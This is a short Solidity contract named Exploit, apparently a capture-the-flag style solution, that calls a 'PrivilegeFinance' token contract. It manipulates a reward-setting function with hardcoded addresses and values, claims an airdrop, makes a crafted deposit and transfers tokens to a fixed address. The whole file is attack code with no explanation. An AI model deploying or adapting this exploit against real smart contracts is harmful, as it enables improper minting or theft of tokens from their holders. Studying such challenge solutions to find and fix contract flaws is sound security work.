pragma solidity ^0.7.0;

contract Exploit {
    function exploit(address Privilege) public {
        PrivilegeFinance Pri = PrivilegeFinance(Privilege);
        uint256 amount = 1000;
        Pri.DynamicRew(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, 1677729609, 20000000 / amount * 100, 50);
        Pri.Airdrop();
        Pri.deposit(address(0), 1, msg.sender);
        Pri.transfer(0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b, 999);
    }
}

